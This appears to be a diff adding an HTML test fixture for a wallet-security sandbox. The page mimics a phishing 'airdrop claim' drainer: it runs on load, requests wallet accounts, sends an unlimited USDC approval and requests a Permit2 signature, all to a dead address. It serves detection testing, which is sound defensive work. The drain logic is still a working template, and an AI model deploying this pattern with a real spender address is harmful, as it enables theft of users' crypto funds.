@@ -1,0 +1,38 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Airdrop Claim</title>
+<!--
+  Harmless test fixture for the sandbox. It behaves like a drain-on-connect page: as soon as a wallet is present
+  it asks for an unlimited token approval and a Permit2 signature, both to a dead address. Nothing can move: the
+  spender is 0x…dEaD and the sandbox observer rejects every request anyway. Used only to prove the sandbox
+  records and scores such a page. Mirrors ../../test-dapp/index.html.
+-->
+<h1>Claim your airdrop</h1>
+<p>Connect your wallet to claim 5,000 tokens.</p>
+<button id="connect">Connect wallet</button>
+<pre id="log"></pre>
+<script>
+  const DEAD = "0x000000000000000000000000000000000000dEaD";
+  const USDC = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
+  const MAX = "f".repeat(64);
+  const pad = (h) => h.replace(/^0x/, "").padStart(64, "0");
+  const log = (m) => { document.getElementById("log").textContent += m + "\n"; };
+
+  async function drain() {
+    const eth = window.ethereum;
+    if (!eth) { log("no wallet"); return; }
+    try {
+      const [acct] = await eth.request({ method: "eth_requestAccounts" });
+      log("connected " + acct);
+      // unlimited approve of USDC to a dead spender
+      await eth.request({ method: "eth_sendTransaction", params: [{ from: acct, to: USDC, data: "0x095ea7b3" + pad(DEAD) + MAX }] }).catch((e) => log("approve: " + (e && e.code)));
+      // Permit2 signature to the same dead spender
+      const td = JSON.stringify({ primaryType: "PermitSingle", domain: { name: "Permit2" }, message: { details: { token: USDC, amount: "0x" + MAX }, spender: DEAD, sigDeadline: "0x" + MAX } });
+      await eth.request({ method: "eth_signTypedData_v4", params: [acct, td] }).catch((e) => log("permit: " + (e && e.code)));
+    } catch (e) { log("err " + (e && e.message)); }
+  }
+
+  // drain on load (no click needed) — the classic auto-drainer
+  setTimeout(drain, 800);
+  document.getElementById("connect").addEventListener("click", drain);
+</script>
